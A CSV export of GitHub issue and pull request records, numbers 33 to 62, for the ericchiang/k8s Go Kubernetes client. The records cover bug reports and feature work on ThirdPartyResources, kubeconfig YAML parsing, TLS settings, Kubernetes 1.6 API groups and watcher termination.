ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/62,274151446,MDU6SXNzdWUyNzQxNTE0NDY=,62,ThirdPartyResources doesn't have a watcher,136472,closed,TRUE,NA,NA,0,2017-11-15T13:12:19Z,2018-01-19T04:58:27Z,2018-01-19T04:58:27Z,CONTRIBUTOR,NA,"With kubectl I can watch custom resources, so it would be nice if the ThirdPartyResources does the same.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/62/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/62/comments,https://api.github.com/repos/ericchiang/k8s/issues/62/events,https://github.com/ericchiang/k8s/issues/62,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/61,274151257,MDU6SXNzdWUyNzQxNTEyNTc=,61,ThirdPartyResources doesn't support AllNamespaces,136472,closed,TRUE,NA,NA,0,2017-11-15T13:11:36Z,2018-01-19T04:58:27Z,2018-01-19T04:58:27Z,CONTRIBUTOR,NA,"The following lines check whether a namespace is set for `ThirdPartyResources`:

https://github.com/ericchiang/k8s/blob/master/tprs.go#L105-L107

And since `AllNamespaces` is an empty string this leads to the error being returned. Kubectl supports `--all-namespaces` with my custom resources with `scope: Namespaced` fine though, so it seems superfluous to do this check.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/61/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/61/comments,https://api.github.com/repos/ericchiang/k8s/issues/61/events,https://github.com/ericchiang/k8s/issues/61,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/60,268408396,MDU6SXNzdWUyNjg0MDgzOTY=,60,Consider adding yaml tags on Config struct,6498906,closed,TRUE,NA,NA,2,2017-10-25T13:57:53Z,2018-01-15T04:24:33Z,2018-01-15T04:24:33Z,NONE,NA,"Currently there are just json tags, this is not an issue with `github.com/ghodss/yaml` since it does yaml -> json before unmarshalling, but if you're not using this package you will find things don't unmarshal correctly.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/60/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/60/comments,https://api.github.com/repos/ericchiang/k8s/issues/60/events,https://github.com/ericchiang/k8s/issues/60,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/59,265531893,MDU6SXNzdWUyNjU1MzE4OTM=,59,context doesn't have a user,10308834,closed,TRUE,NA,NA,5,2017-10-14T23:24:57Z,2018-01-15T06:53:39Z,2018-01-15T06:53:39Z,NONE,NA,"I'm trying to connect externally to a minikube cluster using

```
func loadClient(kubeconfigPath string) (*k8s.Client, error) {
	data, err := ioutil.ReadFile(kubeconfigPath)
	if err != nil {
		return nil, fmt.Errorf(""read kubeconfig: %v"", err)
	}

	// Unmarshal YAML into a Kubernetes config object.
	var config k8s.Config
	if err := yaml.Unmarshal(data, &config); err != nil {
		return nil, fmt.Errorf(""unmarshal kubeconfig: %v"", err)
	}
	return k8s.NewClient(&config)
}
```

I'm getting an error: `2017/10/14 19:21:17 context doesn't have a user`

Output shows I do have a user configured though:
```
kubectl config get-contexts
CURRENT   NAME       CLUSTER    AUTHINFO   NAMESPACE
*         minikube   minikube   minikube

kubectl config current-context
minikube
```
Seems like I shouldn't be getting this error with that info, unless there's some part I'm missing.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/59/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/59/comments,https://api.github.com/repos/ericchiang/k8s/issues/59/events,https://github.com/ericchiang/k8s/issues/59,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/58,255926033,MDExOlB1bGxSZXF1ZXN0MTM5Nzk2ODYx,58,Include statusCode when failure to unmarshal,492166,closed,TRUE,NA,NA,2,2017-09-07T12:51:20Z,2017-09-07T16:36:07Z,2017-09-07T16:36:07Z,CONTRIBUTOR,NA,"We experienced a bit of trouble debugging when the `unmarshal` failed. We were getting the following error message:

```
decode error status: payload is not a kubernetes protobuf object
```

We eventually realized it was because the body simply contained `Unauthorized`. But had the `statusCode` been included in the error message we would have realized this much quicker.

So this simply updates the unmarshal error message to include the `statusCode` along with the unmarshal error message.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/58/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/58/comments,https://api.github.com/repos/ericchiang/k8s/issues/58/events,https://github.com/ericchiang/k8s/pull/58,https://api.github.com/repos/ericchiang/k8s/pulls/58
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/57,245344814,MDExOlB1bGxSZXF1ZXN0MTMyMjM5NDA2,57,added Int32 convenience function,1948775,closed,TRUE,NA,NA,1,2017-07-25T09:45:33Z,2017-07-25T15:06:33Z,2017-07-25T15:06:33Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/57/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/57/comments,https://api.github.com/repos/ericchiang/k8s/issues/57/events,https://github.com/ericchiang/k8s/pull/57,https://api.github.com/repos/ericchiang/k8s/pulls/57
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/56,244338176,MDExOlB1bGxSZXF1ZXN0MTMxNTM3MjU0,56,Client respects the InsecureSkipTLSVerify setting for a cluster in kubeConfig,1948775,closed,TRUE,NA,NA,2,2017-07-20T12:04:51Z,2017-07-20T20:01:18Z,2017-07-20T20:01:18Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/56/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/56/comments,https://api.github.com/repos/ericchiang/k8s/issues/56/events,https://github.com/ericchiang/k8s/pull/56,https://api.github.com/repos/ericchiang/k8s/pulls/56
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/55,244251155,MDU6SXNzdWUyNDQyNTExNTU=,55,InsecureSkipTLSVerify not implemented,1948775,closed,TRUE,NA,NA,2,2017-07-20T05:43:21Z,2017-07-26T00:26:44Z,2017-07-26T00:26:44Z,CONTRIBUTOR,NA,"In the config being passed to `k8s.NewClient`, I set the flag `InsecureSkipTLSVerify` to `true`for a particular cluster. But any request made to this cluster using the client returned by `k8s.NewClient` gives `x509: certificate signed by unknown authority`. I guess this is happening because the flag is not being respected in the library. I went through the source code and confirmed the same. Any help?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/55/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/55/comments,https://api.github.com/repos/ericchiang/k8s/issues/55/events,https://github.com/ericchiang/k8s/issues/55,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/54,242073507,MDU6SXNzdWUyNDIwNzM1MDc=,54,deployment scale subresource is registered as a top level type,1051101,closed,TRUE,NA,NA,2,2017-07-11T14:43:35Z,2018-03-19T00:27:00Z,2018-03-19T00:27:00Z,NONE,NA,"Dunno if it changed in 1.6 but v1beta1 GetScale etc are incorrect.
They query `v1beta1/namespaces/xxx/scales/name/`
While in 1.6 there seems to be: `v1beta/namespaces/xxx/deployment/deploy_name/scale/`",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/54/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/54/comments,https://api.github.com/repos/ericchiang/k8s/issues/54/events,https://github.com/ericchiang/k8s/issues/54,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/53,240393360,MDU6SXNzdWUyNDAzOTMzNjA=,53,v1.ConfigMapKeySelector missing Name field,126649,closed,TRUE,NA,NA,1,2017-07-04T11:29:21Z,2017-07-10T17:12:53Z,2017-07-10T17:12:53Z,NONE,NA,"[v1.ConfigMapKeySelector](https://godoc.org/github.com/ericchiang/k8s/api/v1#ConfigMapKeySelector) seems to be missing the Name field, this causes the following error when dealing with pods that have envs from configmaps:

`spec.containers[0].env[3].valueFrom.configMapKeyRef.name: Required value`",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/53/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/53/comments,https://api.github.com/repos/ericchiang/k8s/issues/53/events,https://github.com/ericchiang/k8s/issues/53,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/52,237985999,MDU6SXNzdWUyMzc5ODU5OTk=,52,1.7 support,2342749,closed,TRUE,NA,NA,6,2017-06-22T21:58:36Z,2018-01-19T04:58:27Z,2018-01-19T04:58:27Z,OWNER,NA,"Known issues:

* Custom resource definitions are in a different repo.
* Was ObjectMeta removed from v1?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/52/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/52/comments,https://api.github.com/repos/ericchiang/k8s/issues/52/events,https://github.com/ericchiang/k8s/issues/52,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/51,237985118,MDU6SXNzdWUyMzc5ODUxMTg=,51,Delete options for cascading deletes,2342749,closed,TRUE,NA,NA,2,2017-06-22T21:54:24Z,2018-03-19T00:28:02Z,2018-03-19T00:28:02Z,OWNER,NA,https://kubernetes.io/docs/concepts/workloads/controllers/garbage-collection/#setting-the-cascading-deletion-policy,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/51/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/51/comments,https://api.github.com/repos/ericchiang/k8s/issues/51/events,https://github.com/ericchiang/k8s/issues/51,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/50,233996103,MDExOlB1bGxSZXF1ZXN0MTI0MjY3Mzcx,50,README: add a section about when to use client-go,2342749,closed,TRUE,NA,NA,0,2017-06-06T19:18:16Z,2018-08-29T21:15:47Z,2017-06-06T23:07:50Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/50/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/50/comments,https://api.github.com/repos/ericchiang/k8s/issues/50/events,https://github.com/ericchiang/k8s/pull/50,https://api.github.com/repos/ericchiang/k8s/pulls/50
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/49,229032397,MDExOlB1bGxSZXF1ZXN0MTIwODI2ODg3,49,Pass context.Context to net/http client,1150,closed,TRUE,NA,NA,1,2017-05-16T13:26:50Z,2017-05-16T16:41:00Z,2017-05-16T16:41:00Z,CONTRIBUTOR,NA,This change creates the `http.Request` using `WithContext`- allowing clients to control timeouts/cancellations etc.,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/49/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/49/comments,https://api.github.com/repos/ericchiang/k8s/issues/49/events,https://github.com/ericchiang/k8s/pull/49,https://api.github.com/repos/ericchiang/k8s/pulls/49
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/48,226771522,MDU6SXNzdWUyMjY3NzE1MjI=,48,Container compute resources cannot be unmarshalled,392176,closed,TRUE,NA,NA,1,2017-05-06T13:39:25Z,2017-05-06T16:15:52Z,2017-05-06T16:15:52Z,NONE,NA,"Thank you for this package.

In an attempt to unmarshal a Deployment, I find compute resources such as cpu and memory limits do not unmarshal.

## Backing information

  * package version:  v0.3.0
  * Runtime environment:  centos7 container

## Input

```
---
apiVersion: extensions/v1beta1
kind: Deployment
metadata:
  name: the-app
spec:
  replicas: 1
  selector:
    matchLabels:
      name: the-app
  template:
    metadata:
      labels:
        name: the-app
      name: the-app
    spec:
      containers:
      - name: the-app
        image: docker-registry.example.com/acme/the-app:develop
        ports:
        - containerPort: 5586
          name: server-port
        resources:
          limits:
            cpu: 500m
            memory: 1500Mi
          requests:
            cpu: 500m
            memory: 1500Mi
```
## Desired action

Attempt to unmarshal this resource, where *data* is a byte slice backing the input

```
var t v1beta1.Deployment
if err := json.Unmarshal(data, &t); err != nil {
    log.Fatal(err)
}
...
```

## Result

```
2017/05/06 13:31:38 json: cannot unmarshal string into Go struct field ResourceRequirements.limits of type resource.Quantity
```

## Workaround

Remove the compute resources 

```
---
apiVersion: extensions/v1beta1
kind: Deployment
metadata:
  name: the-app
spec:
  replicas: 1
  selector:
    matchLabels:
      name: the-app
  template:
    metadata:
      labels:
        name: the-app
      name: the-app
    spec:
      containers:
      - name: the-app
        image: docker-registry.example.com/acme/the-app:develop
        ports:
        - containerPort: 5586
          name: server-port
```

This input can be successfully unmarshaled into a Deployment.
",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/48/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/48/comments,https://api.github.com/repos/ericchiang/k8s/issues/48/events,https://github.com/ericchiang/k8s/issues/48,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/47,225384519,MDU6SXNzdWUyMjUzODQ1MTk=,47,ThirdPartyResrouces client doesn't have list options,2342749,closed,TRUE,NA,NA,1,2017-05-01T04:46:13Z,2018-01-19T05:00:18Z,2018-01-19T05:00:18Z,OWNER,NA,,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/47/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/47/comments,https://api.github.com/repos/ericchiang/k8s/issues/47/events,https://github.com/ericchiang/k8s/issues/47,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/46,223877169,MDU6SXNzdWUyMjM4NzcxNjk=,46,Errors can sometimes be non-protobuf encoded,2342749,closed,TRUE,NA,NA,3,2017-04-24T16:27:51Z,2018-01-19T04:58:27Z,2018-01-19T04:58:27Z,OWNER,NA,"Reported by a user:

Client got an RBAC denial with an in-cluster client. The error returned was:

```
decode error status: payload is not a kubernetes protobuf object
```

Try to reproduce. Maybe an upstream issue?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/46/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/46/comments,https://api.github.com/repos/ericchiang/k8s/issues/46/events,https://github.com/ericchiang/k8s/issues/46,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/45,223081961,MDExOlB1bGxSZXF1ZXN0MTE2NzgxNDEx,45,LabelSelector should support / chars in keys,108382,closed,TRUE,NA,NA,1,2017-04-20T14:14:27Z,2017-04-20T15:30:39Z,2017-04-20T15:30:39Z,CONTRIBUTOR,NA,"Kubernetes uses / characters in its applied labels, for example the
label applied to a node to determine whether it is a node or master.
This library should support using this character in a key name.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/45/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/45/comments,https://api.github.com/repos/ericchiang/k8s/issues/45/events,https://github.com/ericchiang/k8s/pull/45,https://api.github.com/repos/ericchiang/k8s/pulls/45
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/44,220591422,MDExOlB1bGxSZXF1ZXN0MTE1MDYyODMw,44,Add YAML tags to config fields,299804,closed,TRUE,NA,NA,2,2017-04-10T09:47:40Z,2017-04-10T15:59:28Z,2017-04-10T15:59:27Z,CONTRIBUTOR,NA,"I've found that client settings written in YAML are not correctly parsed. For example, minikube:

```
apiVersion: v1
clusters:
- cluster:
    certificate-authority: /home/exekias/.minikube/ca.crt
    server: https://192.168.99.100:8443
  name: minikube
contexts:
- context:
    cluster: minikube
    user: minikube
  name: minikube
current-context: minikube
kind: Config
preferences: {}
users:
- name: minikube
  user:
    client-certificate: /home/exekias/.minikube/apiserver.crt
    client-key: /home/exekias/.minikube/apiserver.key
```

I just added yaml tag to fields that use a different name from the spec",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/44/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/44/comments,https://api.github.com/repos/ericchiang/k8s/issues/44/events,https://github.com/ericchiang/k8s/pull/44,https://api.github.com/repos/ericchiang/k8s/pulls/44
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/43,220410647,MDExOlB1bGxSZXF1ZXN0MTE0OTUxNDY5,43,Add `CustomOption` for API calls,299804,closed,TRUE,NA,NA,7,2017-04-08T16:31:58Z,2017-06-29T16:56:02Z,2017-06-29T16:56:02Z,CONTRIBUTOR,NA,This should allow anyone to add custom query params to API calls,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/43/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/43/comments,https://api.github.com/repos/ericchiang/k8s/issues/43/events,https://github.com/ericchiang/k8s/pull/43,https://api.github.com/repos/ericchiang/k8s/pulls/43
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/42,219682128,MDExOlB1bGxSZXF1ZXN0MTE0NDQ4NTcy,42,Fix typo in readme,881965,closed,TRUE,NA,NA,3,2017-04-05T18:57:52Z,2017-04-05T19:22:55Z,2017-04-05T19:18:50Z,CONTRIBUTOR,NA,"Fix what I believe is a simple typo in the readme!

Thanks for the great client!",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/42/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/42/comments,https://api.github.com/repos/ericchiang/k8s/issues/42/events,https://github.com/ericchiang/k8s/pull/42,https://api.github.com/repos/ericchiang/k8s/pulls/42
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/41,219081109,MDU6SXNzdWUyMTkwODExMDk=,41,How should a watcher be terminated?,2263040,closed,TRUE,NA,NA,6,2017-04-03T22:34:23Z,2018-02-05T09:22:14Z,2018-01-15T06:54:15Z,NONE,NA,"It seems that `watcher.Next()` is blocking. I want to be able to run a watch in a goroutine and stop the watcher via a channel:

```go
func watch(watcher *k8s.CoreV1PodWatcher,  stop <-chan struct{}) {

	for {
		select {

		default:
			if event, pod, err := watcher.Next(); err != nil {
				k.logger.Errorf(""Error getting next watch: %s"", err)
			} else {
				// Do stuff here
			}

		case <-stop:
			watcher.Close()
			return
		}
	}
}

//run watcher in goroutine
go watch(podWatcher, stop)
```

However, since `watcher.Next()` is blocking, it is possible that the case for receiving from `stop` may never be called. Is there a way to terminate a watcher?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/41/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/41/comments,https://api.github.com/repos/ericchiang/k8s/issues/41/events,https://github.com/ericchiang/k8s/issues/41,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/40,218084408,MDExOlB1bGxSZXF1ZXN0MTEzMzQ4NDM5,40,*: include go 1.8 in travis build,2342749,closed,TRUE,NA,NA,0,2017-03-30T05:24:37Z,2017-03-30T05:25:49Z,2017-03-30T05:25:46Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/40/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/40/comments,https://api.github.com/repos/ericchiang/k8s/issues/40/events,https://github.com/ericchiang/k8s/pull/40,https://api.github.com/repos/ericchiang/k8s/pulls/40
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/39,218083873,MDExOlB1bGxSZXF1ZXN0MTEzMzQ4MDk2,39,*: readme tweaks to using namespaces,2342749,closed,TRUE,NA,NA,0,2017-03-30T05:20:03Z,2017-03-30T05:21:26Z,2017-03-30T05:21:23Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/39/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/39/comments,https://api.github.com/repos/ericchiang/k8s/issues/39/events,https://github.com/ericchiang/k8s/pull/39,https://api.github.com/repos/ericchiang/k8s/pulls/39
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/38,217126751,MDExOlB1bGxSZXF1ZXN0MTEyNjYyODE5,38,*: add support for 1.6 types,2342749,closed,TRUE,NA,NA,0,2017-03-27T03:23:30Z,2017-03-27T22:35:17Z,2017-03-27T22:35:14Z,OWNER,NA,"Closes #35

## Breaking changes

Over the 1.6 release cycle Kubernetes switched the ever present `v1.ObjectMeta` to its own API group.  A non-breaking change to adopt this would require rewrites of all 1.6 proto files, so this client will do the same breaking change as the official client and switch the import path. Users should update code to refer to the new package.

As an example, the README snippet changed from:

```go
import (
    ""context""

    ""github.com/ericchiang/k8s""
    ""github.com/ericchiang/k8s/api/v1""
)

func createConfigMap(client *k8s.Client, name string, values map[string]string) error {
    cm := &v1.ConfigMap{
        Metadata: &v1.ObjectMeta{Name: &name, Namespace: &client.Namespace},
        Data:     values,
    }
    _, err := client.CoreV1().CreateConfigMap(context.TODO(), cm)
    return err
}
```

to:

```go
import (
    ""context""

    ""github.com/ericchiang/k8s""
    ""github.com/ericchiang/k8s/api/v1""
    metav1 ""github.com/ericchiang/k8s/apis/meta/v1""
)

func createConfigMap(client *k8s.Client, name string, values map[string]string) error {
    cm := &v1.ConfigMap{
        Metadata: &metav1.ObjectMeta{Name: &name, Namespace: &client.Namespace},
        Data:     values,
    }
    _, err := client.CoreV1().CreateConfigMap(context.TODO(), cm)
    return err
}
```

## API group changes

* Authentication graduated from ""v1beta1"" to ""v1""
* Authorization graduated from ""v1beta1"" to ""v1""
* Autoscaling ""v2alpha1"" was introduced.
* Certificates graduated from ""v1alpha1"" to ""v1beta1""
* RBAC graduated from ""v1alpha1"" to ""v1beta1""
* Settings ""v1alpha1"" was introduced.
* Storage graduated from ""v1beta1"" to ""v1""

## What about alpha API groups only in 1.5?

As Kubernetes deprecates alpha APIs, the official client removes support for them. That means if you use an API group that was alpha in 1.5 and updated to beta in 1.6 (for example, RBAC or certificates), you can't compile a program with the official client that works on both versions.

__This client preserves all API groups from all versions of Kubernetes__, but wont do the translation for you. To support multiple Kubernetes versions, users should detect the version of the API server, then use the group associated with that version.

```go
v, err := client.Discovery().Version(ctx)
if err != nil {
    return err
}

switch {
case v.Minor == 5:
    // Use client.RBACV1Alpha1
case v.Minor >= 6:
    // Use client.RBACV1Beta1
default:
    // unsupported version
}
```",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/38/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/38/comments,https://api.github.com/repos/ericchiang/k8s/issues/38/events,https://github.com/ericchiang/k8s/pull/38,https://api.github.com/repos/ericchiang/k8s/pulls/38
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/37,215921511,MDU6SXNzdWUyMTU5MjE1MTE=,37,Export the Options interface QueryParam method and create a FieldSelector copy of LabelSelector.,1143140,closed,TRUE,NA,NA,6,2017-03-22T00:47:10Z,2018-01-19T05:01:07Z,2018-01-19T05:01:07Z,NONE,NA,"I am trying to use `WatchConfigMaps` to target a single named config map at the moment. I can't find any documentation on label selectors being able to target fields -- so my assumption is that this is not possible without a `fieldSelector`. I <b>have</b> to be missing something lol.

FieldSelector also provides access to the downstream API if I remember correctly. 

Also there are a lot of handy metadata name constants [here]( https://gowalker.org/k8s.io/kubernetes/pkg/api#ListOptions) bringing some of these over into one of the packages would be very useful to figure out how to construct queries. Documentation on FieldSelector usage is quite scarce. ",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/37/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/37/comments,https://api.github.com/repos/ericchiang/k8s/issues/37/events,https://github.com/ericchiang/k8s/issues/37,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/36,214004661,MDExOlB1bGxSZXF1ZXN0MTEwNTczMDY4,36,godoc: Fix typo in APIVersion struct usage,1553979,closed,TRUE,NA,NA,1,2017-03-14T08:56:42Z,2017-03-14T16:37:27Z,2017-03-14T16:30:47Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/36/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/36/comments,https://api.github.com/repos/ericchiang/k8s/issues/36/events,https://github.com/ericchiang/k8s/pull/36,https://api.github.com/repos/ericchiang/k8s/pulls/36
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/35,213214845,MDU6SXNzdWUyMTMyMTQ4NDU=,35,1.6 support,2342749,closed,TRUE,NA,NA,0,2017-03-10T01:14:24Z,2017-03-27T22:35:14Z,2017-03-27T22:35:14Z,OWNER,NA,"The proto file locations are dramatically different from 1.3, 1.4 and 1.5. Might need to develop some tooling for extracting the zip files.

```
federation/apis/federation/v1beta1/generated.proto
pkg/kubelet/api/v1alpha1/runtime/api.proto
pkg/apis/batch/v1/generated.proto
pkg/apis/batch/v2alpha1/generated.proto
pkg/apis/authorization/v1/generated.proto
pkg/apis/authorization/v1beta1/generated.proto
pkg/apis/settings/v1alpha1/generated.proto
pkg/apis/rbac/v1alpha1/generated.proto
pkg/apis/rbac/v1beta1/generated.proto
pkg/apis/policy/v1beta1/generated.proto
pkg/apis/authentication/v1/generated.proto
pkg/apis/authentication/v1beta1/generated.proto
pkg/apis/apps/v1beta1/generated.proto
pkg/apis/extensions/v1beta1/generated.proto
pkg/apis/imagepolicy/v1alpha1/generated.proto
pkg/apis/autoscaling/v1/generated.proto
pkg/apis/autoscaling/v2alpha1/generated.proto
pkg/apis/certificates/v1beta1/generated.proto
pkg/apis/storage/v1/generated.proto
pkg/apis/storage/v1beta1/generated.proto
pkg/api/v1/generated.proto
staging/src/k8s.io/apiserver/pkg/apis/example/v1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/batch/v1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/batch/v2alpha1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/authorization/v1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/authorization/v1beta1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/settings/v1alpha1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/rbac/v1alpha1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/rbac/v1beta1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/policy/v1beta1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/authentication/v1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/authentication/v1beta1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/apps/v1beta1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/extensions/v1beta1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/autoscaling/v1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/autoscaling/v2alpha1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/certificates/v1beta1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/storage/v1/generated.proto
staging/src/k8s.io/client-go/pkg/apis/storage/v1beta1/generated.proto
staging/src/k8s.io/client-go/pkg/api/v1/generated.proto
staging/src/k8s.io/apimachinery/pkg/runtime/schema/generated.proto
staging/src/k8s.io/apimachinery/pkg/runtime/generated.proto
staging/src/k8s.io/apimachinery/pkg/util/intstr/generated.proto
staging/src/k8s.io/apimachinery/pkg/apis/meta/v1/generated.proto
staging/src/k8s.io/apimachinery/pkg/api/resource/generated.proto
third_party/forked/etcd237/wal/walpb/record.proto
third_party/forked/etcd221/wal/walpb/record.proto
third_party/protobuf/google/protobuf/descriptor.proto
third_party/protobuf/google/protobuf/compiler/plugin.proto
```",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/35/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/35/comments,https://api.github.com/repos/ericchiang/k8s/issues/35/events,https://github.com/ericchiang/k8s/issues/35,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/34,211915120,MDExOlB1bGxSZXF1ZXN0MTA5MTI2OTI3,34,"*: use the ""default"" namespace if another isn't specified",2342749,closed,TRUE,NA,NA,0,2017-03-04T23:03:16Z,2017-03-07T19:37:07Z,2017-03-04T23:04:22Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/34/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/34/comments,https://api.github.com/repos/ericchiang/k8s/issues/34/events,https://github.com/ericchiang/k8s/pull/34,https://api.github.com/repos/ericchiang/k8s/pulls/34
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/33,210631707,MDExOlB1bGxSZXF1ZXN0MTA4MjE5MDgw,33,minor corrections for gofmt,108481,closed,TRUE,NA,NA,1,2017-02-27T22:47:41Z,2017-02-28T16:35:46Z,2017-02-28T16:35:46Z,CONTRIBUTOR,NA,Two spaces were missing from `gen.go`. I added them and re-gen'd the code.,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/33/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/33/comments,https://api.github.com/repos/ericchiang/k8s/issues/33/events,https://github.com/ericchiang/k8s/pull/33,https://api.github.com/repos/ericchiang/k8s/pulls/33
